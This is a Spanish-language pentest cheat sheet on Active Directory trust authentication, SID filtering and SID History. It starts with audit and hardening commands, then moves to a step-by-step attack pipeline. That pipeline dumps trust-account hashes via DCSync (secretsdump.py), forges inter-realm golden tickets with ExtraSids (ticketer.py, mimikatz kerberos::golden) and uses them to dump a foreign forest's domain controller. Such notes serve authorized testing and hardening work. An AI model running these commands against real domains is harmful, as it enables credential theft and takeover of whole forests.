---
aliases:
  - Selective Auth
  - SID Filtering
  - SID History
  - Trust Authentication
tags:
  - type/concept
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[AD - Domain & Forest Trusts]]'
  - '[[Trust Abuse]]'
---
# AD - Domain & Forest Trusts - Authentication & SID Filtering

***

## Authentication Types Cross-Trust

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `klist` (post cross-trust auth) | TGT + referral tickets visibles (`ms-srv-realm`) | Confirmar inter-realm. |
| `whoami /upn` | UPN identifica auth realm efectivo | Cross-trust auth check. |
| `whoami /groups` | Groups merged (foreign + local SIDs) | Token expansion check. |
| `runas /netonly /user:<other-dom>\u cmd` | Cross-trust auth desde Windows | Test interactive. |
| `kinit user@OTHER.REALM` | Cross-realm Kerberos desde Linux | Linux interop. |
^ad-auth-types

**Flujo cross-realm Kerberos:**
1. User en `dom-A` quiere acceder recurso en `dom-B`.
2. DC local (dom-A) emite **inter-realm TGT** firmado con trust password (krbtgt/dom-B@dom-A).
3. User presenta inter-realm TGT al KDC de `dom-B`.
4. KDC de `dom-B` valida con trust password → emite TGS para el recurso.
5. User presenta TGS al server → access.

```cmd
:: Test cross-trust + ver tickets resultantes
runas /netonly /user:partner.com\user cmd
:: Dentro shell:
klist
:: Ticket "krbtgt/PARTNER.COM@CORP.LOCAL" = inter-realm TGT
```

___

## Selective Authentication (Hardening)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADTrust -Filter * \| ? SelectiveAuthentication` | Trusts con Selective Auth ON | Audit hardening. |
| `Set-ADTrust -Identity <trust> -SelectiveAuthentication $true` | Habilitar Selective Auth | Hardening fix. |
| `(Get-Acl "AD:<resource-DN>").Access \| ? {$_.ActiveDirectoryRights -match "ExtendedRight" -and $_.ObjectType -eq "68B1D179-0D15-4D4F-AB71-46152E79A7BC"}` | ACEs `Allowed-To-Authenticate` (GUID `68B1D179...`) | Per-resource audit. |
| `dsacls "<resource-DN>" \| findstr /i "Allowed to authenticate"` | ACEs via dsacls native | Sin RSAT. |
| `netdom trust <local> /domain:<foreign> /selectiveauth /verbose` | Estado Selective Auth | Native check. |
^ad-auth-selective

**Sin Selective Auth (default):** todos los users del foreign forest pueden autenticarse a cualquier recurso local.

**Con Selective Auth:** foreign principals solo pueden auth a recursos donde tengan ACE explícita con `Allowed-To-Authenticate` extended right.

```powershell
# Foreign principals con auth allowed en computers locales
$Foreign = "PARTNER"
Get-ADComputer -Filter * | % {
  Get-Acl "AD:$($_.DistinguishedName)" |
    Select -Expand Access |
    Where {
      $_.ActiveDirectoryRights -match "ExtendedRight" -and
      $_.ObjectType -eq "68B1D179-0D15-4D4F-AB71-46152E79A7BC" -and
      $_.IdentityReference -like "*$Foreign*"
    } |
    Select @{n='Computer';e={$_.Name}},IdentityReference
}
```

___

## SID Filtering

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADTrust -Filter * \| Select Name,SIDFilteringForestAware,SIDFilteringQuarantined,Source,Target` | Estado SID filtering | Audit hardening. |
| `Get-ADTrust -Filter * -Pr trustAttributes \| ? {$_.trustAttributes -band 0x4}` | Trusts con `Quarantined` (SID Filter ON) | Bitwise check. |
| `Get-ADTrust -Filter * -Pr trustAttributes \| ? {-not ($_.trustAttributes -band 0x4) -and -not ($_.trustAttributes -band 0x40)}` | Trusts SIN SID filter (RISKY) | Audit critical. |
| `netdom trust <local> /domain:<foreign> /quarantine /verbose` | Estado SID filter native | Sin RSAT. |
| `netdom trust <local> /domain:<foreign> /quarantine:yes` | Habilitar SID filter | Hardening fix. |
^ad-auth-sidfilter

**Defaults:**
- Forest trust → SID Filtering **ON** (bit `Quarantined` 0x4 o `Treat-As-External` 0x40).
- External trust → SID Filtering **ON**.
- Intra-forest (parent-child) → SID Filtering **OFF** (mismo forest = full trust).

**Por qué importa:** sin SID filtering, atacante con DCSync en forest A puede forjar inter-realm TGT con `ExtraSids` apuntando a Domain Admins de forest B → forest takeover cross-forest.

```powershell
# Audit decoded
Get-ADTrust -Filter * -Properties trustAttributes |
  Select Name,@{n='SIDFilter';e={
    if ($_.trustAttributes -band 0x4) {"Quarantined (ON)"}
    elseif ($_.trustAttributes -band 0x40) {"Treat-As-External (ON)"}
    elseif ($_.trustAttributes -band 0x20) {"Intra-forest (N/A)"}
    else {"OFF — RISKY"}
  }}
```

___

## SID History

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter * -Properties sIDHistory \| ? sIDHistory` | Users con SID History (migration leftover) | Audit. |
| `Get-ADUser <user> -Pr sIDHistory \| Select -Expand sIDHistory` | Decode SIDs históricos | Per-user. |
| `Set-ADObject <user-DN> -Replace @{SIDHistory=...}` | Set SID History (priv, risky) | Migration only. |
| `Set-ADObject <user-DN> -Clear sIDHistory` | Limpiar SID History post-migración | Hardening. |
| BloodHound `MATCH p=(u:User)-[:HasSIDHistory]->(d:Domain) RETURN p` | Visualizar via Cypher | Attack path. |
^ad-auth-sidhistory

**Atributo:** `sIDHistory` almacena SIDs anteriores de un user (migration via ADMT). Auth tokens incluyen todos los SIDs en sIDHistory + groups.

**Abuse:** SID History inyectado + SID Filter OFF cross-forest = forge TGT con foreign Tier 0 SID = forest takeover.

```powershell
# Audit users con SID History (sospechoso si no migration)
Get-ADUser -Filter * -Properties sIDHistory,whenCreated |
  Where sIDHistory |
  Select Name,SamAccountName,whenCreated,@{n='SIDs';e={$_.sIDHistory -join '; '}}
```

___

## Forging Inter-Realm TGT

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `secretsdump.py corp/admin:pass@<DC> -just-dc` | Dump completo NTDS (trust accounts + krbtgt) | Pre-attack DCSync. |
| `secretsdump.py corp/admin:pass@<DC> -just-dc-user 'PARTNER$'` | Hash trust account específico | Targeted DCSync. |
| `ticketer.py -nthash <trust-hash> -domain-sid <local-SID> -domain corp.local -extra-sid <foreign-DA-SID> -spn krbtgt/partner.com Administrator` | Forge inter-realm TGT con ExtraSids | Linux Impacket. |
| `kerberos::golden /domain:corp.local /sid:<local-SID> /sids:<foreign-DA-SID> /rc4:<trust-hash> /user:Administrator /service:krbtgt/partner.com /target:partner.com /ticket:inter.kirbi` | Forge desde Windows | Mimikatz. |
| `KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass <foreign-DC>` | DCSync foreign con TGT forjado | Cross-forest pivoting. |
^ad-auth-tgtforge

**Caveat crítico:** solo funciona si SID Filtering está **OFF** en el trust. Con SID filter ON, los `ExtraSids` foreign son descartados por el KDC del foreign domain.

```bash
# Pipeline completo Linux
# 1. DCSync local
secretsdump.py 'corp/admin:Pass!'@<DC> -just-dc-user 'PARTNER$'
# Output: PARTNER$:<RID>:aad3b...:<NT-HASH>:::

# 2. Forge inter-realm TGT
ticketer.py -nthash <NT-HASH> \
  -domain-sid S-1-5-21-LOCAL-LOCAL-LOCAL \
  -domain corp.local \
  -extra-sid S-1-5-21-FOREIGN-FOREIGN-FOREIGN-519 \
  -spn krbtgt/partner.com \
  Administrator

# 3. Use TGT contra foreign DC
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass partner-dc.partner.com
```

___

## Trust Account Compromise Chain

| **Step** | **Comando** | **Resultado** |
|:---:|:---:|:---:|
| 1. DCSync local domain | `secretsdump.py corp/da:pass@<DC> -just-dc` | NTDS dump incluye `<NETBIOS>$` |
| 2. Identificar trust accounts | `grep '$:' ntds.txt` | Lista TDOs con hashes |
| 3. Verificar SID Filter target | `Get-ADTrust -Pr trustAttributes \| ? Name -eq partner` | Confirmar `0x4` = ON / OFF |
| 4. Forge inter-realm TGT | `ticketer.py` (Linux) o `kerberos::golden` (mimikatz) | TGT cross-trust con ExtraSids |
| 5. Inject ticket | `KRB5CCNAME=ticket.ccache` o `kerberos::ptt` | Ticket activo |
| 6. Access foreign | `secretsdump.py -k -no-pass <foreign-DC>` | Foreign DA si SID filter OFF |
^ad-auth-trustchain

```bash
# Verificar antes — SID filter status del trust target
# Si "Quarantined" o "Treat-As-External" presente = ATTACK BLOCKED
nltest /domain_trusts /v | grep -A2 "partner.com"
```

***
